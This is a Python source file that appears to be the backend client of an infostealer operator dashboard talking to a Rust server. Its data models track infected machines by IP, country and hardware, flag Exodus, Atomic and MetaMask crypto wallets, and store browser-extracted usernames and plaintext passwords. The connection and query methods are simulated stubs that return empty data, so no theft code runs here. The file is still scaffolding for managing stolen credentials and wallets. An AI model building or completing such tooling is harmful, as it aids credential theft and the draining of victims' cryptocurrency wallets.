"""
Backend client for communicating with the Rust server
"""

import asyncio
import json
import socket
import threading
import time
from typing import Callable, Optional, Dict, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import queue

@dataclass
class ClientInfo:
    id: str
    ip: str
    country: str
    os: str
    gpu: str
    cpu: str
    first_seen: str
    last_seen: str
    connection_count: int
    wallet_exodus: bool
    wallet_atomic: bool
    wallet_metamask: bool

@dataclass
class PasswordEntry:
    id: str
    client_ip: str
    url: str
    web_browser: str
    username: str
    password: str
    strength: str
    created_time: Optional[str]
    extracted_time: str

@dataclass
class LogEntry:
    timestamp: str
    message: str
    log_type: str

@dataclass
class SystemStats:
    total_clients: int
    active_clients_24h: int
    active_clients_7d: int
    active_clients_30d: int
    total_passwords: int
    total_files: int
    country_stats: Dict[str, int]

class BackendClient:
    """Client for communicating with the Rust backend server"""
    
    def __init__(self, host: str = "localhost", port: int = 8080):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.connected = False
        self.running = False
        self.event_queue = queue.Queue()
        self.event_handlers: Dict[str, list] = {}
        self.receive_thread: Optional[threading.Thread] = None
        
    def connect(self) -> bool:
        """Connect to the backend server"""
        try:
            # For now, we'll implement a simple TCP connection
            # In a real implementation, this would connect to the Rust server's API
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5.0)
            
            # For demo purposes, we'll simulate a connection
            # In reality, this would connect to the Rust server's event stream
            print(f"Attempting to connect to {self.host}:{self.port}")
            
            # Simulate connection (in real implementation, connect to actual server)
            self.connected = True
            self.running = True
            
            # Start the receive thread
            self.receive_thread = threading.Thread(target=self._receive_events, daemon=True)
            self.receive_thread.start()
            
            print("Connected to backend server")
            return True
            
        except Exception as e:
            print(f"Failed to connect to backend: {e}")
            self.connected = False
            return False
    
    def disconnect(self):
        """Disconnect from the backend server"""
        self.running = False
        self.connected = False
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
        
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=1.0)
    
    def _receive_events(self):
        """Receive events from the backend server (runs in separate thread)"""
        # This is a simulation - in real implementation, this would receive
        # actual events from the Rust server
        
        # Simulate some demo events
        demo_events = [
            {
                "type": "ServerStarted",
                "data": {"port": self.port}
            },
            {
                "type": "LogEntry",
                "data": {
                    "timestamp": datetime.now().isoformat(),
                    "message": "Server ready. Waiting for clients...",
                    "log_type": "System"
                }
            }
        ]
        
        # Send initial demo events
        for event in demo_events:
            if not self.running:
                break
            self.event_queue.put(event)
            time.sleep(0.5)
        
        # Continue running and generating demo events periodically
        counter = 0
        while self.running:
            time.sleep(5.0)  # Send demo events every 5 seconds
            
            if not self.running:
                break
                
            counter += 1
            demo_event = {
                "type": "LogEntry", 
                "data": {
                    "timestamp": datetime.now().isoformat(),
                    "message": f"System heartbeat #{counter}",
                    "log_type": "System"
                }
            }
            self.event_queue.put(demo_event)
    
    def get_events(self) -> list:
        """Get all pending events from the queue"""
        events = []
        try:
            while True:
                event = self.event_queue.get_nowait()
                events.append(event)
        except queue.Empty:
            pass
        return events
    
    def on(self, event_type: str, handler: Callable):
        """Register an event handler"""
        if event_type not in self.event_handlers:
            self.event_handlers[event_type] = []
        self.event_handlers[event_type].append(handler)
    
    def emit_event(self, event_type: str, data: Any):
        """Emit an event to registered handlers"""
        if event_type in self.event_handlers:
            for handler in self.event_handlers[event_type]:
                try:
                    handler(data)
                except Exception as e:
                    print(f"Error in event handler: {e}")
    
    def start_server(self, port: int) -> bool:
        """Start the backend server on specified port"""
        # In real implementation, this would send a command to the Rust server
        message = {
            "command": "start_server",
            "port": port
        }
        
        # Simulate server start
        self.emit_event("ServerStarted", {"port": port})
        
        log_event = {
            "timestamp": datetime.now().isoformat(),
            "message": f"Server started on port {port}",
            "log_type": "System"
        }
        self.emit_event("LogEntry", log_event)
        
        return True
    
    def stop_server(self) -> bool:
        """Stop the backend server"""
        # In real implementation, this would send a command to the Rust server
        message = {
            "command": "stop_server"
        }
        
        # Simulate server stop
        self.emit_event("ServerStopped", {})
        
        log_event = {
            "timestamp": datetime.now().isoformat(),
            "message": "Server stopped",
            "log_type": "System"
        }
        self.emit_event("LogEntry", log_event)
        
        return True
    
    def get_clients(self) -> list:
        """Get all connected clients"""
        # In real implementation, this would query the Rust server
        # For demo, return empty list
        return []
    
    def get_passwords(self) -> list:
        """Get all extracted passwords"""
        # In real implementation, this would query the Rust server
        # For demo, return empty list
        return []
    
    def get_stats(self) -> SystemStats:
        """Get system statistics"""
        # In real implementation, this would query the Rust server
        return SystemStats(
            total_clients=0,
            active_clients_24h=0,
            active_clients_7d=0,
            active_clients_30d=0,
            total_passwords=0,
            total_files=0,
            country_stats={}
        )